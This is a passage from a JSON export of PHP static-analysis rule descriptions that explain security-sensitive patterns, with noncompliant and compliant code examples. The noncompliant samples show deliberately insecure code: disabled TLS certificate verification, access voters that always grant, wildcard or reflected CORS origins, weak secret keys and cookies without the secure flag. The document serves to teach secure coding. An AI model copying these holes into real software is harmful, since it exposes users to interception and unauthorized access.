        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Using command line arguments is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-7281\">CVE-2018-7281</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12326\">CVE-2018-12326</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-3198\">CVE-2011-3198</a> </li>\n</ul>\n<p>Command line arguments can be dangerous just like any other user input. They should never be used without being first validated and sanitized.</p>\n<p>Remember also that any user can retrieve the list of processes running on a system, which makes the arguments provided to them visible. Thus\npassing sensitive information via command line arguments should be considered as insecure.</p>\n<p>This rule raises an issue when on every program entry points (<code>main</code> methods) when command line arguments are used. The goal is to guide\nsecurity code reviews.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> any of the command line arguments are used without being sanitized first. </li>\n  <li> your application accepts sensitive information via command line arguments. </li>\n</ul>\n<p>If you answered yes to any of these questions you are at risk.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all command line arguments before using them.</p>\n<p>Any user or application can list running processes and see the command line arguments they were started with. There are safer ways of providing\nsensitive information to an application than exposing them in the command line. It is common to write them on the process' standard input, or give the\npath to a file containing the information.</p>\n<h2>Sensitive Code Example</h2>\n<p>Builtin access to <code>$argv</code></p>\n<pre>\nfunction globfunc() {\n    global $argv; // Sensitive. Reference to global $argv\n    foreach ($argv as $arg) { // Sensitive.\n        // ...\n    }\n}\n\nfunction myfunc($argv) {\n    $param = $argv[0]; // OK. Reference to local $argv parameter\n    // ...\n}\n\nforeach ($argv as $arg) { // Sensitive. Reference to $argv.\n    // ...\n}\n\n$myargv = $_SERVER['argv']; // Sensitive. Equivalent to $argv.\n\nfunction serve() {\n    $myargv = $_SERVER['argv']; // Sensitive.\n    // ...\n}\n\nmyfunc($argv); // Sensitive\n\n$myvar = $HTTP_SERVER_VARS[0]; // Sensitive. Note: HTTP_SERVER_VARS has ben removed since PHP 5.4.\n\n$options = getopt('a:b:'); // Sensitive. Parsing arguments.\n\n$GLOBALS[\"argv\"]; // Sensitive. Equivalent to $argv.\n\nfunction myglobals() {\n    $GLOBALS[\"argv\"]; // Sensitive\n}\n\n$argv = [1,2,3]; // Sensitive. It is a bad idea to override argv.\n</pre>\n<p>Zend Console</p>\n<pre>\nnew Zend\\Console\\Getopt(['myopt|m' =&gt; 'this is an option']); // Sensitive\n</pre>\n<p>Getopt-php library</p>\n<pre>\nnew \\GetOpt\\Option('m', 'myoption', \\GetOpt\\GetOpt::REQUIRED_ARGUMENT); // Sensitive\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A1_2017-Injection\">Top 10 2017 Category A1 - Injection</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/88\">CWE-88 - Argument Injection or Modification</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/214\">CWE-214 - Information Exposure Through Process Environment</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4828": {
        "name": "Signaling processes is security-sensitive",
        "htmlDesc": "<p>Signaling processes or process groups can seriously affect the stability of this application or other applications on the same system.</p>\n<p>Accidentally setting an incorrect <code>PID</code> or <code>signal</code> or allowing untrusted sources to assign arbitrary values to these\nparameters may result in a denial of service.</p>\n<p>Also, the system treats the signal differently if the destination <code>PID</code> is less than or equal to 0. This different behavior may affect\nmultiple processes with the same (E)UID simultaneously if the call is left uncontrolled.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> The parameters <code>pid</code> and <code>sig</code> are untrusted (they come from an external source). </li>\n  <li> This function is triggered by non-administrators. </li>\n  <li> Signal handlers on the target processes stop important functions. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> For stateful applications with user management, ensure that only administrators trigger this code. </li>\n  <li> Verify that the <code>pid</code> and <code>sig</code> parameters are correct before using them. </li>\n  <li> Ensure that the process sending the signals runs with as few OS privileges as possible. </li>\n  <li> Isolate the process on the system based on its (E)UID. </li>\n  <li> Ensure that the signal does not interrupt any essential functions when intercepted by a target’s signal handlers. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<pre>\n$targetPid = (int)$_GET[\"pid\"];\nposix_kill($targetPid, 9); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n$targetPid = (int)$_GET[\"pid\"];\n\n// Validate the untrusted PID,\n// With a pre-approved list or authorization checks\nif (isValidPid($targetPid)) {\n    posix_kill($targetPid, 9);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/283\">CWE-283 - Unverified Ownership</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man1/kill.1.html\">kill(1) — Linux manual page</a> </li>\n  <li> <a href=\"https://man7.org/linux/man-pages/man2/kill.2.html\">kill(2) — Linux manual page</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4829": {
        "name": "Reading the Standard Input is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>Reading Standard Input is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2005-2337\">CVE-2005-2337</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-11449\">CVE-2017-11449</a> </li>\n</ul>\n<p>It is common for attackers to craft inputs enabling them to exploit software vulnerabilities. Thus any data read from the standard input (stdin)\ncan be dangerous and should be validated.</p>\n<p>This rule flags code that reads from the standard input.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> data read from the standard input is not sanitized before being used. </li>\n</ul>\n<p>You are at risk if you answered yes to this question.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p><a href=\"https://www.owasp.org/index.php/Input_Validation_Cheat_Sheet\">Sanitize</a> all data read from the standard input before using it.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n// Any reference to STDIN is Sensitive\n$varstdin = STDIN; // Sensitive\nstream_get_line(STDIN, 40); // Sensitive\nstream_copy_to_stream(STDIN, STDOUT); // Sensitive\n// ...\n\n\n// Except those references as they can't create an injection vulnerability.\nftruncate(STDIN, 5); // OK\nftell(STDIN); // OK\nfeof(STDIN); // OK\nfseek(STDIN, 5); // OK\nfclose(STDIN); // OK\n\n\n// STDIN can also be referenced like this\n$mystdin = 'php://stdin'; // Sensitive\n\nfile_get_contents('php://stdin'); // Sensitive\nreadfile('php://stdin'); // Sensitive\n\n$input = fopen('php://stdin', 'r'); // Sensitive\nfclose($input); // OK\n</pre>\n<h2>See</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/20\">CWE-20 - Improper Input Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4830": {
        "name": "Server certificates should be verified during SSL/TLS connections",
        "htmlDesc": "<p>This vulnerability makes it possible that an encrypted communication is intercepted.</p>\n<h2>Why is this an issue?</h2>\n<p>Transport Layer Security (TLS) provides secure communication between systems over the internet by encrypting the data sent between them.\nCertificate validation adds an extra layer of trust and security to this process to ensure that a system is indeed the one it claims to be.</p>\n<p>When certificate validation is disabled, the client skips a critical security check. This creates an opportunity for attackers to pose as a trusted\nentity and intercept, manipulate, or steal the data being transmitted.</p>\n<h3>What is the potential impact?</h3>\n<p>Establishing trust in a secure way is a non-trivial task. When you disable certificate validation, you are removing a key mechanism designed to\nbuild this trust in internet communication, opening your system up to a number of potential threats.</p>\n<h4>Identity spoofing</h4>\n<p>If a system does not validate certificates, it cannot confirm the identity of the other party involved in the communication. An attacker can\nexploit this by creating a fake server and masquerading as a legitimate one. For example, they might set up a server that looks like your bank’s\nserver, tricking your system into thinking it is communicating with the bank. This scenario, called identity spoofing, allows the attacker to collect\nany data your system sends to them, potentially leading to significant data breaches.</p>\n<h4>Loss of data integrity</h4>\n<p>When TLS certificate validation is disabled, the integrity of the data you send and receive cannot be guaranteed. An attacker could modify the data\nin transit, and you would have no way of knowing. This could range from subtle manipulations of the data you receive to the injection of malicious\ncode or malware into your system. The consequences of such breaches of data integrity can be severe, depending on the nature of the data and the\nsystem.</p>\n<h2>How to fix it in cURL</h2>\n<h3>Code examples</h3>\n<p>The following code contains examples of disabled certificate validation.</p>\n<p>The certificate validation gets disabled by setting <code>CURLOPT_SSL_VERIFYPEER</code> to <code>false</code>. To enable validation set the value\nto <code>true</code> or do not set <code>CURLOPT_SSL_VERIFYPEER</code> at all to use the secure default value.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n$curl = curl_init();\ncurl_setopt($curl, CURLOPT_URL, 'https://example.com/');\ncurl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // Noncompliant\ncurl_exec($curl);\ncurl_close($curl);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n$curl = curl_init();\ncurl_setopt($curl, CURLOPT_URL, 'https://example.com/');\ncurl_exec($curl);\ncurl_close($curl);\n</pre>\n<h3>How does this work?</h3>\n<p>Addressing the vulnerability of disabled TLS certificate validation primarily involves re-enabling the default validation.</p>\n<p>To avoid running into problems with invalid certificates, consider the following sections.</p>\n<h4>Using trusted certificates</h4>\n<p>If possible, always use a certificate issued by a well-known, trusted CA for your server. Most programming environments come with a predefined list\nof trusted root CAs, and certificates issued by these authorities are validated automatically. This is the best practice, and it requires no\nadditional code or configuration.</p>\n<h4>Working with self-signed certificates or non-standard CAs</h4>\n<p>In some cases, you might need to work with a server using a self-signed certificate, or a certificate issued by a CA not included in your trusted\nroots. Rather than disabling certificate validation in your code, you can add the necessary certificates to your trust store.</p>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-mobile-top-10/2016-risks/m3-insecure-communication\">Mobile Top 10 2016 Category M3 - Insecure\n  Communication</a> </li>\n  <li> OWASP - <a href=\"https://mobile-security.gitbook.io/masvs/security-requirements/0x10-v5-network_communication_requirements\">Mobile AppSec\n  Verification Standard - Network Communication Requirements</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/295\">CWE-295 - Improper Certificate Validation</a> </li>\n</ul>",
        "severity": "CRITICAL"
      },
      "php:S4834": {
        "name": "Controlling permissions is security-sensitive",
        "htmlDesc": "<p>This rule is deprecated, and will eventually be removed.</p>\n<p>The access control of an application must be properly implemented in order to restrict access to resources to authorized entities otherwise this\ncould lead to vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-12999\">CVE-2018-12999</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-10285\">CVE-2018-10285</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-7455\">CVE-2017-7455</a> </li>\n</ul>\n<p>Granting correct permissions to users, applications, groups or roles and defining required permissions that allow access to a resource is\nsensitive, must therefore be done with care. For instance, it is obvious that only users with administrator privilege should be authorized to\nadd/remove the administrator permission of another user.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> Granted permission to an entity (user, application) allow access to information or functionalities not needed by this entity. </li>\n  <li> Privileges are easily acquired (eg: based on the location of the user, type of device used, defined by third parties, does not require approval\n  …​). </li>\n  <li> Inherited permission, default permission, no privileges (eg: anonymous user) is authorized to access to a protected resource. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>At minimum, an access control system should:</p>\n<ul>\n  <li> Use a well-defined access control model like <a href=\"https://en.wikipedia.org/wiki/Role-based_access_control\">RBAC</a> or <a\n  href=\"https://en.wikipedia.org/wiki/Access-control_list\">ACL</a>. </li>\n  <li> Entities' permissions should be reviewed regularly to remove permissions that are no longer needed. </li>\n  <li> Respect <a href=\"https://en.wikipedia.org/wiki/Principle_of_least_privilege\">the principle of least privilege</a> (\"<em>an entity has access\n  only the information and resources that are necessary for its legitimate purpose</em>\"). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>CakePHP</p>\n<pre>\nuse Cake\\Auth\\BaseAuthorize;\nuse Cake\\Controller\\Controller;\n\nabstract class MyAuthorize extends BaseAuthorize { // Sensitive. Method extending Cake\\Auth\\BaseAuthorize.\n    // ...\n}\n\n// Note that \"isAuthorized\" methods will only be detected in direct subclasses of Cake\\Controller\\Controller.\nabstract class MyController extends Controller {\n    public function isAuthorized($user) { // Sensitive. Method called isAuthorized in a Cake\\Controller\\Controller.\n        return false;\n    }\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/276\">CWE-276 - Incorrect Default Permissions</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/732\">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/668\">CWE-668 - Exposure of Resource to Wrong Sphere</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/277\">CWE-277 - Insecure Inherited Permissions</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S5808": {
        "name": "Authorizations should be based on strong decisions",
        "htmlDesc": "<p>When granting users access to resources of an application, such an authorization should be based on strong decisions. For instance, a user may be\nauthorized to access a resource only if they are authenticated, or if they have the correct role and privileges.</p>\n<h2>Why is this an issue?</h2>\n<p>Access control is a critical aspect of web frameworks that ensures proper authorization and restricts access to sensitive resources or actions. To\nenable access control, web frameworks offer components that are responsible for evaluating user permissions and making access control decisions. They\nmight examine the user’s credentials, such as roles or privileges, and compare them against predefined rules or policies to determine whether the user\nshould be granted access to a specific resource or action.</p>\n<p>Conventionally, these checks should never grant access to every request received. If an endpoint or component is meant to be public, then it should\nbe ignored by access control components. Conversely, if an endpoint should deny some users from accessing it, then access control has to be configured\ncorrectly for this endpoint.</p>\n<p>Granting unrestricted access to all users can lead to security vulnerabilities and potential misuse of critical functionalities. It is important to\ncarefully assess access decisions based on factors such as user roles, resource sensitivity, and business requirements. Implementing a robust and\ngranular access control mechanism is crucial for the security and integrity of the web application itself and its surrounding environment.</p>\n<h3>What is the potential impact?</h3>\n<p>Not verifying user access strictly can introduce significant security risks. Some of the most prominent risks are listed below. Depending on the\nuse case, it is very likely that other risks are introduced on top of the ones listed.</p>\n<h4>Unauthorized access</h4>\n<p>As the access of users is not checked strictly, it becomes very easy for an attacker to gain access to restricted areas or functionalities,\npotentially compromising the confidentiality, integrity, and availability of sensitive resources. They may exploit this access to perform malicious\nactions, such as modifying or deleting data, impersonating legitimate users, or gaining administrative privileges, ultimately compromising the\nsecurity of the system.</p>\n<h4>Theft of sensitive data</h4>\n<p>Theft of sensitive data can result from incorrect access control if attackers manage to gain access to databases, file systems, or other storage\nmechanisms where sensitive data is stored. This can lead to the theft of personally identifiable information (PII), financial data, intellectual\nproperty, or other confidential information. The stolen data can be used for various malicious purposes, such as identity theft, financial fraud, or\nselling the data on the black market, causing significant harm to individuals and organizations affected by the breach.</p>\n<h2>How to fix it in Symfony</h2>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<p>The <code>vote</code> method of a <a href=\"https://symfony.com/doc/current/security/voters.html\">VoterInterface</a> implementation is not compliant\nwhen it returns only an affirmative decision (<code>ACCESS_GRANTED</code>):</p>\n<pre data-diff-id=\"201\" data-diff-type=\"noncompliant\">\nclass NoncompliantVoter implements VoterInterface\n{\n    public function vote(TokenInterface $token, $subject, array $attributes)\n    {\n        return self::ACCESS_GRANTED; // Noncompliant\n    }\n}\n</pre>\n<p>The <code>voteOnAttribute</code> method of a <a href=\"https://symfony.com/doc/current/security/voters.html\">Voter</a> class is not compliant when\nit returns only an affirmative decision (<code>true</code>):</p>\n<pre data-diff-id=\"202\" data-diff-type=\"noncompliant\">\nclass NoncompliantVoter extends Voter\n{\n    protected function supports(string $attribute, $subject)\n    {\n        return true;\n    }\n\n    protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token)\n    {\n        return true; // Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<p>The <code>vote</code> method of a <a href=\"https://symfony.com/doc/current/security/voters.html\">VoterInterface</a> type should return a negative\ndecision (<code>ACCESS_DENIED</code>) or abstain from making a decision (<code>ACCESS_ABSTAIN</code>):</p>\n<pre data-diff-id=\"201\" data-diff-type=\"compliant\">\nclass CompliantVoter implements VoterInterface\n{\n    public function vote(TokenInterface $token, $subject, array $attributes)\n    {\n        if (foo()) {\n            return self::ACCESS_GRANTED;\n        } else if (bar()) {\n            return self::ACCESS_ABSTAIN;\n        }\n        return self::ACCESS_DENIED;\n    }\n}\n</pre>\n<p>The <code>voteOnAttribute</code> method of a <a href=\"https://symfony.com/doc/current/security/voters.html\">Voter</a> type should return a negative\ndecision (<code>false</code>):</p>\n<pre data-diff-id=\"202\" data-diff-type=\"compliant\">\nclass CompliantVoter extends Voter\n{\n    protected function supports(string $attribute, $subject)\n    {\n        return true;\n    }\n\n    protected function voteOnAttribute(string $attribute, $subject, TokenInterface $token)\n    {\n        if (foo()) {\n            return true;\n        }\n        return false;\n    }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Standards</h3>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/285\">CWE-285 - Improper Authorization</a> </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S6339": {
        "name": "Secret keys and salt values should be robust",
        "htmlDesc": "<h2>Why is this an issue?</h2>\n<p>Secret keys are used in combination with an algorithm to encrypt data. A typical use case is an authentication system. For such a system to be\nsecure, the secret key should have a value which cannot be guessed and which is long enough to not be vulnerable to brute-force attacks.</p>\n<p>A \"salt\" is an extra piece of data which is included when hashing data such as a password. Its value should have the same properties as a secret\nkey.</p>\n<p>This rule raises an issue when it detects that a secret key or a salt has a predictable value or that it’s not long enough.</p>\n<h3>Noncompliant code example</h3>\n<p>WordPress:</p>\n<pre>\ndefine('AUTH_KEY', 'hello'); // Noncompliant\ndefine('AUTH_SALT', 'hello'); // Noncompliant\ndefine('AUTH_KEY', 'put your unique phrase here'); // Noncompliant, this is the default value\n</pre>\n<h3>Compliant solution</h3>\n<p>WordPress:</p>\n<pre>\ndefine('AUTH_KEY', 'D&amp;ovlU#|CvJ##uNq}bel+^MFtT&amp;.b9{UvR]g%ixsXhGlRJ7q!h}XWdEC[BOKXssj');\ndefine('AUTH_SALT', 'FIsAsXJKL5ZlQo)iD-pt??eUbdc{_Cn&lt;4!d~yqz))&amp;B D?AwK%)+)F2aNwI|siOe');\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A02_2021-Cryptographic_Failures/\">Top 10 2021 Category A2 - Cryptographic Failures</a> </li>\n  <li> <a href=\"https://wordpress.org/support/article/editing-wp-config-php/#security-keys\">wordpress.org</a> - WordPress Security Keys </li>\n</ul>",
        "severity": "MAJOR"
      },
      "php:S2092": {
        "name": "Creating cookies without the \"secure\" flag is security-sensitive",
        "htmlDesc": "<p>When a cookie is protected with the <code>secure</code> attribute set to <em>true</em> it will not be send by the browser over an unencrypted HTTP\nrequest and thus cannot be observed by an unauthorized person during a man-in-the-middle attack.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> the cookie is for instance a <em>session-cookie</em> not designed to be sent over non-HTTPS communication. </li>\n  <li> it’s not sure that the website contains <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content\">mixed content</a> or not\n  (ie HTTPS everywhere or not) </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> It is recommended to use <code>HTTPs</code> everywhere so setting the <code>secure</code> flag to <em>true</em> should be the default behaviour\n  when creating cookies. </li>\n  <li> Set the <code>secure</code> flag to <em>true</em> for session-cookies. </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>In <em>php.ini</em> you can specify the flags for the session cookie which is security-sensitive:</p>\n<pre>\nsession.cookie_secure = 0; // Sensitive: this security-sensitive session cookie is created with the secure flag set to false (cookie_secure = 0)\n</pre>\n<p>Same thing in PHP code:</p>\n<pre>\nsession_set_cookie_params($lifetime, $path, $domain, false);\n// Sensitive: this security-sensitive session cookie is created with the secure flag (the fourth argument) set to _false_\n</pre>\n<p>If you create a custom security-sensitive cookie in your PHP code:</p>\n<pre>\n$value = \"sensitive data\";\nsetcookie($name, $value, $expire, $path, $domain, false);  // Sensitive: a security-sensitive cookie is created with the secure flag  (the sixth argument) set to _false_\n</pre>\n<p>By default <a href=\"https://www.php.net/manual/en/function.setcookie.php\"><code>setcookie</code></a> and <a\nhref=\"https://www.php.net/manual/en/function.setrawcookie.php\"><code>setrawcookie</code></a> functions set the sixth argument / <code>secure</code>\nflag to <em>false:</em></p>\n<pre>\n$value = \"sensitive data\";\nsetcookie($name, $value, $expire, $path, $domain);  // Sensitive: a security-sensitive cookie is created with the secure flag (the sixth argument) not defined (by default to false)\nsetrawcookie($name, $value, $expire, $path, $domain);  // Sensitive: a security-sensitive cookie is created with the secure flag (the sixth argument) not defined (by default to false)\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\nsession.cookie_secure = 1; // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to cookie_secure property set to 1\n</pre>\n<pre>\nsession_set_cookie_params($lifetime, $path, $domain, true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the fouth argument) set to true\n</pre>\n<pre>\n$value = \"sensitive data\";\nsetcookie($name, $value, $expire, $path, $domain, true); // Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the sixth  argument) set to true\nsetrawcookie($name, $value, $expire, $path, $domain, true);// Compliant: the sensitive cookie will not be send during an unencrypted HTTP request thanks to the secure flag (the sixth argument) set to true\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure\">Top 10 2017 Category A3 - Sensitive Data\n  Exposure</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/311\">CWE-311 - Missing Encryption of Sensitive Data</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/315\">CWE-315 - Cleartext Storage of Sensitive Information in a Cookie</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/614\">CWE-614 - Sensitive Cookie in HTTPS Session Without 'Secure' Attribute</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "php:S5122": {
        "name": "Having a permissive Cross-Origin Resource Sharing policy is security-sensitive",
        "htmlDesc": "<p>Having a permissive Cross-Origin Resource Sharing policy is security-sensitive. It has led in the past to the following vulnerabilities:</p>\n<ul>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-0269\">CVE-2018-0269</a> </li>\n  <li> <a href=\"http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-14460\">CVE-2017-14460</a> </li>\n</ul>\n<p><a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">Same origin policy</a> in browsers prevents, by default and for\nsecurity-reasons, a javascript frontend to perform a cross-origin HTTP request to a resource that has a different origin (domain, protocol, or port)\nfrom its own. The requested target can append additional HTTP headers in response, called <a\nhref=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">CORS</a>, that act like directives for the browser and change the access control policy\n/ relax the same origin policy.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> You don’t trust the origin specified, example: <code>Access-Control-Allow-Origin: untrustedwebsite.com</code>. </li>\n  <li> Access control policy is entirely disabled: <code>Access-Control-Allow-Origin: *</code> </li>\n  <li> Your access control policy is dynamically defined by a user-controlled input like <a\n  href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Origin\"><code>origin</code></a> header. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<ul>\n  <li> The <code>Access-Control-Allow-Origin</code> header should be set only for a trusted origin and for specific resources. </li>\n  <li> Allow only selected, trusted domains in the <code>Access-Control-Allow-Origin</code> header. Prefer whitelisting domains over blacklisting or\n  allowing any domain (do not use * wildcard nor blindly return the <code>Origin</code> header content without any checks). </li>\n</ul>\n<h2>Sensitive Code Example</h2>\n<p>PHP built-in header function:</p>\n<pre>\nheader(\"Access-Control-Allow-Origin: *\"); // Sensitive\n</pre>\n<p>Laravel:</p>\n<pre>\nresponse()-&gt;header('Access-Control-Allow-Origin', \"*\"); // Sensitive\n</pre>\n<p>Symfony:</p>\n<pre>\nuse Symfony\\Component\\HttpFoundation\\Response;\n\n$response = new Response(\n    'Content',\n    Response::HTTP_OK,\n    ['Access-Control-Allow-Origin' =&gt; '*'] // Sensitive\n);\n$response-&gt;headers-&gt;set('Access-Control-Allow-Origin', '*'); // Sensitive\n</pre>\n<p>User-controlled origin:</p>\n<pre>\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\HttpFoundation\\Request;\n\n$origin = $request-&gt;headers-&gt;get('Origin');\n\n$response-&gt;headers-&gt;set('Access-Control-Allow-Origin', $origin); // Sensitive\n</pre>\n<h2>Compliant Solution</h2>\n<p>PHP built-in header function:</p>\n<pre>\nheader(\"Access-Control-Allow-Origin: $trusteddomain\");\n</pre>\n<p>Laravel:</p>\n<pre>\nresponse()-&gt;header('Access-Control-Allow-Origin', $trusteddomain);\n</pre>\n<p>Symfony:</p>\n<pre>\nuse Symfony\\Component\\HttpFoundation\\Response;\n\n$response = new Response(\n    'Content',\n    Response::HTTP_OK,\n    ['Access-Control-Allow-Origin' =&gt; $trusteddomain]\n);\n\n$response-&gt;headers-&gt;set('Access-Control-Allow-Origin', $trusteddomain);\n</pre>\n<p>User-controlled origin validated with an allow-list:</p>\n<pre>\nuse Symfony\\Component\\HttpFoundation\\Response;\nuse Symfony\\Component\\HttpFoundation\\Request;\n\n$origin = $request-&gt;headers-&gt;get('Origin');\n\nif (in_array($origin, $trustedOrigins)) {\n    $response-&gt;headers-&gt;set('Access-Control-Allow-Origin', $origin);\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A05_2021-Security_Misconfiguration/\">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/\">Top 10 2021 Category A7 - Identification and\n  Authentication Failures</a> </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS\">developer.mozilla.org</a> - CORS </li>\n  <li> <a href=\"https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy\">developer.mozilla.org</a> - Same origin policy </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n  <li> <a href=\"https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html#cross-origin-resource-sharing\">OWASP HTML5 Security\n  Cheat Sheet</a> - Cross Origin Resource Sharing </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/346\">CWE-346 - Origin Validation Error</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/942\">CWE-942 - Overly Permissive Cross-domain Whitelist</a> </li>\n</ul>",
        "severity": "MINOR"
      },
      "javasecurity:S5131": {
